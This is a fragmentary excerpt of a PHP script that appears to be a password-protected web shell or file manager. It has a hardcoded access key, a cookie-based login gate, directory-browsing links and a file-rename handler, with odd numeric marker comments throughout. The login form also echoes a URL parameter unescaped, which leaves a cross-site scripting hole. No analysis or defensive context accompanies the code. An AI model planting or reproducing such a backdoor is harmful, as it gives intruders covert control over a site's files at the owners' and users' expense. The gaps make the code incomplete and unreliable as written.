...
$auth_key = "9f4ef2bd8a6b2dd79d0f006f0f3f6563";
...
$pass = false;
if (isset($_COOKIE['pw_name_69302'])) {
    if(($_COOKIE['pw_name_69302']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_69302'])) {
        if(($_POST['pw_name_69302']) == $auth_key) {
            setcookie("pw_name_69302", $_POST['pw_name_69302']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_69302' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726436371772787 1726436371702101 1726436371399904 1726436371382754
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726436371772787 1726436371702101 1726436371399904 1726436371382754
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726436371772787 1726436371702101 1726436371399904 1726436371382754
            $name = PATH . "/" . $_GET['r'];
